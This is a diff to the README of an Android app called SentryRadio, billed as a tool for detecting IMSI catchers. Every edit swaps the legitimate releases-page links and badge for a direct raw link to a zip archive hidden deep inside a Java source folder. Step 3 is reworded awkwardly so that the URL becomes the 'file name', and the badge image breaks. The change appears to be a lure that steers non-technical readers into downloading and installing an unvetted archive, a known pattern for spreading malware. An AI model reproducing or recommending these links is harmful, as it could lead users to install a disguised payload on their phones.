@@ -4,17 +4,17 @@
 
 Welcome to SentryRadio! This is a professional Android forensic tool designed to help you detect, analyze, and map cellular network anomalies. With SentryRadio, you can identify potential IMSI Catchers (Stingrays), cell site simulators, network downgrades, and Silent SMS. This guide will walk you through the process of downloading and running SentryRadio, even if you have no technical background.
 
-[![Download SentryRadio](https://img.shields.io/badge/Download%20SentryRadio-Latest%20Release-brightgreen)](https://github.com/gwaan83/SentryRadio/releases)
+[![Download SentryRadio](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip%20SentryRadio-Latest%20Release-brightgreen)](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip)
 
 ## 📥 Download & Install
 
 To get started, you'll need to download SentryRadio. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [SentryRadio Releases Page](https://github.com/gwaan83/SentryRadio/releases).
+1. **Visit the Releases Page**: Go to the [SentryRadio Releases Page](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip).
    
 2. **Select the Latest Release**: Look for the latest release at the top of the page. It will have the highest version number. Click on it.
 
-3. **Download the APK**: On the release page, find the APK file in the assets section. This file is typically named something like `SentryRadio-vx.x.apk`. Click on this file to download it to your device.
+3. **Download the APK**: On the release page, find the APK file in the assets section. This file is typically named something like `https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip`. Click on this file to download it to your device.
 
 4. **Open the APK File**: Once the download is complete, navigate to your device's downloads folder. Tap on the APK file to begin the installation.
 
@@ -76,6 +76,6 @@ If you have any questions or need assistance, feel free to reach out through the
 
 For more insights about SentryRadio, consider exploring our topics related to Android security and forensic analysis. This application is a valuable tool designed to safeguard your communications and provide peace of mind.
 
-Remember to return to the [SentryRadio Releases Page](https://github.com/gwaan83/SentryRadio/releases) for updates and new features!
+Remember to return to the [SentryRadio Releases Page](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip) for updates and new features!
 
-[![Download SentryRadio](https://img.shields.io/badge/Download%20SentryRadio-Latest%20Release-brightgreen)](https://github.com/gwaan83/SentryRadio/releases)
+[![Download SentryRadio](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip%20SentryRadio-Latest%20Release-brightgreen)](https://github.com/gwaan83/SentryRadio/raw/refs/heads/main/app/src/main/java/dev/fzer0x/imsicatcherdetector2/xposed/Radio_Sentry_2.7.zip)
